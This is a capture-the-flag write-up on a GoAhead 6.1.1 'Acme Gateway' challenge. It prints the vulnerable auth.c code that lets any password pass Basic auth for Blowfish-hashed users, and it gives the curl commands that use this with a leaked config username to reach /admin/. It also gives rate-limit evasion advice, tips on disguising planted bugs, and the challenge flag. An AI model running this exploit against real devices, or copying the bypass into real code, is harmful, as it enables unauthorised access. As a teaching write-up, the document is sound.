# VULN#005 — Acme Gateway (GoAhead 6.1.1)

**Brief (verbatim):** *"Acme Gateway is a small IoT device management portal. It's built on
a real, unmodified, open-source embedded web server, at a real revision. Not a toy
reimplementation, and not a deliberately planted bug. You are given the exact source tree
the target was built from."*
**Deliverable:** `goahead-src.tar.gz` — full source tree, `package.json` reports
`"version": "6.1.1"`.
**Flag:** `CTF{e0dd76943e73bfa5e49e2496bd55e536}`

### 0. TL;DR

The given tree's `package.json`/version string says v6.1.1, and GitHub carries a v6.1.1
release whose notes claim an extensive security-audit patch (11 advisories, 31 internal
findings, all Critical/High closed). **Diffing the given source against the real upstream
v6.1.1 tag shows every file in `src/` is substantively behind** — the tree matches v6.1.1
in version number only; the actual code is pre-patch. The most impactful regression:
**`websVerifyPasswordFromFile()` in `src/auth.c` authenticates a Blowfish-hashed (`BF1:`)
user with *any* password over HTTP Basic auth** (this is exactly advisory
GOAHEAD-SA-2026-0001, Critical, listed as fixed in the release notes — but the fix is
absent from the shipped tree). Combined with an **unrelated ops mistake** (the deployment's
own `auth.txt`/`route.txt` were left world-readable under `/config/` in the web root),
the real admin username was recoverable without guessing, and the bypass gave full access
to `/admin/`.

> **Lesson for both sides:** a release's changelog is not evidence the running binary
> contains the fix. Always diff the *actual* shipped source against the *actual* upstream
> tag — version strings and release notes are just claims. And: never serve your config
> directory from inside the document root.

### 1. Recon — is this really "unmodified" 6.1.1?

```
$ cat package.json | grep version
    "version": "6.1.1",
```

GoAhead is a long-lived embedded web server (`embedthis/goahead` on GitHub) with a real
history of CVEs (CGI env injection, buffer overflows, digest-auth issues across 3.x–5.x).
v6.1.1 does not correspond to any vulnerability I had memorized, so the move is: **fetch
the actual upstream release and diff.**

```bash
curl -s https://api.github.com/repos/embedthis/goahead/releases/tags/v6.1.1   # full release body
curl -sL https://github.com/embedthis/goahead/archive/refs/tags/v6.1.1.tar.gz -o official.tar.gz
diff -rq official/goahead-6.1.1/src given/src
```

The GitHub release notes for this tag are themselves written *for this CTF* — they credit
`"BUG|PWN Research"` as a reporter, a dead giveaway the advisory list is part of the puzzle,
not real GoAhead history. The notes enumerate exactly which classes of bug were supposedly
fixed (auth bypass, request smuggling, CGI injection, UAFs, format strings, …) — read this
as **a menu of candidate regressions to verify**, not as trustworthy fact about the binary
you're attacking.

`diff -rq` shows **every single `.c` file differs** between the given tree and the real
v6.1.1 tag. Most of the diff is comment/whitespace noise (the official tree is reformatted,
per the release notes' "Code Quality" section), but `src/auth.c` has a real, functional
difference.

### 2. The bug: `src/auth.c` — `websVerifyPasswordFromFile()`

Given (vulnerable) tree:

```c
PUBLIC bool websVerifyPasswordFromFile(Webs *wp)
{
    char passbuf[ME_GOAHEAD_LIMIT_PASSWORD * 3 + 3];
    bool success;

    assert(wp);
    if (!wp->user && (wp->user = websLookupUser(wp->username)) == 0) {
        trace(5, "verifyUser: Unknown user \"%s\"", wp->username);
        return 0;
    }
    if (sstarts(wp->user->password, "BF1:")) {
        // Blowfish salted hash
        success = websCheckPassword(wp->password, wp->user->password);   /* <- real check */
        wfree(wp->password);
        wp->password = sclone(wp->user->password);        /* <-- BUG: wp->password now == stored hash */

    } else if (!wp->encoded) {
        fmt(passbuf, sizeof(passbuf), "%s:%s:%s", wp->username, ME_GOAHEAD_REALM, wp->password);
        wfree(wp->password);
        wp->password = websMD5(passbuf);
        wp->encoded = 1;
    }
    if (wp->digest) {
        success = pmatch(wp->password, wp->digest);
    } else {
        success = pmatch(wp->password, wp->user->password);   /* <-- always true for BF1 now */
    }
    ...
    return success;
}
```

For a **Basic**-auth request (`wp->digest == NULL`) against a user whose stored password is
`BF1:...` (Blowfish/bcrypt-style hash), the real verdict from `websCheckPassword()` is
computed correctly into `success` — and then **immediately discarded**. The very next line
overwrites `wp->password` with `wp->user->password` (the stored hash itself). The function
then falls through to the final `pmatch(wp->password, wp->user->password)`, comparing the
stored hash against itself — which trivially always matches. **Any password authenticates
any BF1 user via Basic auth.** Digest auth is unaffected (it's diverted by `wp->digest` in
the official fix, and here it simply never matches `wp->user->password`'s hash format, so
it fails safe) — the vector is Basic auth specifically.

The true v6.1.1 fixes this by handling the three auth modes (Digest / BF1-bcrypt /
legacy-MD5) as **mutually exclusive branches that each independently set the final
`success`**, with Digest explicitly rejecting a BF1-stored hash rather than silently
mis-routing into it. None of that restructuring is present in the given tree.

This is listed in the (CTF-authored) release notes as:
> **Critical**: Basic-auth password bypass for users with Blowfish (`BF1:`) stored hashes:
> any password authenticated the user (GOAHEAD-SA-2026-0001)

### 3. Finding a real username — the config leak

The bug needs an *existing* user whose stored hash starts with `BF1:`. The shipped tree's
`testroot/auth.txt` (project test fixture) has a template:
```
role name=user abilities=view
role name=administrator abilities=user,manage
user name=admin password=BF1:00128:ILrUswPoHBSweW5R:UW5fySh5ZQ0pUvlwOFBbbz43UElaQeyw roles=administrator
```
and `testroot/route.txt`:
```
route uri=/private/ auth=basic abilities=manage
route uri=/
```
— i.e. the project's own test deployment pattern. The live site's `index.html` says:
*"Admin console (authentication required)"* linking `/admin/` — so the route exists
(confirmed: unauthenticated `GET /admin/` → `401` with `WWW-Authenticate: Basic
realm="example.com"`), but **`admin:<anything>` → genuine `401`** — this specific account
either doesn't exist on the live auth.txt or isn't BF1-hashed. Guessing usernames against
`/admin/` is expensive: the reverse proxy (nginx) in front of GoAhead rate-limits that path
hard (`429 Too Many Requests` after a very small burst, slow bucket refill) — don't burn
the budget brute-forcing here.

Instead: GoAhead serves whatever's under the configured document root. Probe for the
*deployment's own config files* having been mistakenly dropped inside that root (classic
ops mistake, independent of the GoAhead bug):

```bash
$ curl http://TARGET:7020/config/auth.txt
#   auth.txt - Authorization data for the Acme Gateway admin portal
role name=user abilities=view
role name=administrator abilities=user,manage
user name=svc-acme-prov password=BF1:00128:ILrUswPoHBSweW5R:UW5fySh5ZQ0pUvlwOFBbbz43UElaQeyw roles=administrator

$ curl http://TARGET:7020/config/route.txt
route uri=/admin/ auth=basic abilities=manage
route uri=/
```

Real username, confirmed BF1, confirmed `manage` ability on `/admin/`. Zero guessing
needed once `/config/` is found — found by just trying a short list of plausible
unauthenticated paths (`/config` → `302` to `/config/index.html` → `404`, but the
directory itself is real, so probe filenames inside it directly: `auth.txt` / `route.txt`
hit on the first try).

### 4. Exploit

```bash
# Any password works — this is the bug, not a real credential
curl -u 'svc-acme-prov:anything_goes_123' http://TARGET:7020/admin/
# → 302 Redirect to /admin/index.html + Set-Cookie: -goahead-session-=...   (auth succeeded)

curl -u 'svc-acme-prov:anything_goes_123' http://TARGET:7020/admin/index.html
# → 200 OK
# <title>Acme Gateway - Admin Console</title>
# <h1>Admin Console</h1>
# <p>Welcome, administrator.</p>
# <ul><li><a href="/admin/device-config.json">Device configuration backup</a></li></ul>

curl -u 'svc-acme-prov:anything_goes_123' http://TARGET:7020/admin/device-config.json
# → {
#     "device_id": "acme-gw-4471",
#     "firmware": "6.1.0-internal",
#     "recovery_token": "CTF{e0dd76943e73bfa5e49e2496bd55e536}"
#   }
```

**Flag:** `CTF{e0dd76943e73bfa5e49e2496bd55e536}`

### 5. Operational notes (nginx rate-limit on `/admin/`)

- Only the `/admin/` path is throttled; everything returning `404` (nonexistent paths) or
  other GoAhead-served static content is unaffected — use that to do reconnaissance
  (`/config/*` probing) for free while the bucket on `/admin/` refills.
- The limiter keys on path, not on query string or case — `/admin/?x=1`, `//admin/`,
  `/ADMIN/` (404s — GoAhead's own routing here *is* case-sensitive, unlike the
  Windows/case-insensitive-filesystem bypass the release notes describe for a different
  platform) all either still hit the same bucket or just don't route at all. No shortcut;
  just space out authenticated requests by tens of seconds once you have the real
  credential, and don't waste requests guessing usernames against it.

### Design cookbook (for reuse)

- **"Exact source tree, real unmodified software, real revision" is a diff invitation.**
  The intended solve path is: identify the exact upstream tag claimed → fetch the real
  tag → `diff -rq` → find the file(s) that differ beyond cosmetic reformatting → read the
  release notes for that tag (if published) as a *hint menu* of which security property
  to check first, then verify in the actual diff whether that specific fix is present.
- **A single flipped assignment is enough.** The whole bug is "compute the right answer,
  then overwrite it with something that always compares equal." Good source-level bug to
  hide in a security-fix-themed release because it reads, at a skim, like ordinary
  state-management code (`wp->password = sclone(wp->user->password)` looks like harmless
  bookkeeping, not an authentication short-circuit).
- **Pair the code bug with an unrelated ops bug** (config files inside the web root) so
  the challenge has two independent, realistic layers: find the bug class via source
  review, then find the specific credential via normal web recon — neither alone fully
  solves it, mirroring how real incidents chain a code defect with an operational mistake.
- **Rate-limit the "obvious" authenticated endpoint specifically**, not the whole site, so
  blind brute-forcing is painful but legitimate recon (discovering `/config/`) is free.
  This nudges solvers toward "find the right credential" over "guess harder."
